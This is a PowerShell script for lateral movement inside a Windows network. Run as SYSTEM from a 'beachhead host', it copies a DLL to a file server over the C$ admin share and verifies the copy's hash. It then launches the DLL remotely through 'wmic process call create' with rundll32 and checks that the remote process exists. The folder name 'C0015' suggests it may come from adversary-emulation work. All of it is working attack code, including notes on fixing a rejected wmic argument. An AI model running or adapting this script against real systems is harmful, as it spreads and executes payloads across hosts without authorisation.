<#
.SYNOPSIS
    Stage 143.dll to the backup server and create the process through WMI.
.DESCRIPTION
    Run from the winlogon session on the beachhead host (SYSTEM). The credential is supplied by the
    caller and is never rendered into a command line.
.NOTES
    The comma form of the export argument returns ReturnValue 9; the space form is required.
#>
param(
    [string]$TargetHost = 'FS01',
    [string]$StagedPath  = 'C:\ProgramData\143.dll',
    [string]$LocalSource = 'C:\Users\Public\C0015\143.dll',
    [string]$Export      = 'DllRegisterServer'
)

$remote = "\\$TargetHost\C$\ProgramData\143.dll"
Write-Host "[1] staging $LocalSource -> $remote"
Copy-Item -LiteralPath $LocalSource -Destination $remote -Force

$hashLocal  = (Get-FileHash -LiteralPath $LocalSource -Algorithm SHA256).Hash
$hashRemote = (Get-FileHash -LiteralPath $remote -Algorithm SHA256).Hash
if ($hashLocal -ne $hashRemote) { throw "hash mismatch after copy: $hashLocal vs $hashRemote" }
Write-Host "[2] hash verified $hashLocal"

$inner = "rundll32.exe $StagedPath $Export"
$wmic  = "wmic /node:$TargetHost process call create `"$inner`""
Write-Host "[3] $wmic"
$out = cmd.exe /c $wmic
$out

if ($out -match 'ReturnValue = 9') {
    throw 'wmic rejected the argument list (ReturnValue 9). Check for a comma before the export name.'
}

Write-Host '[4] verifying target-side edge'
Get-CimInstance Win32_Process -ComputerName $TargetHost -Filter "Name='rundll32.exe'" |
    Select-Object ProcessId, ParentProcessId, CommandLine | Format-Table -AutoSize
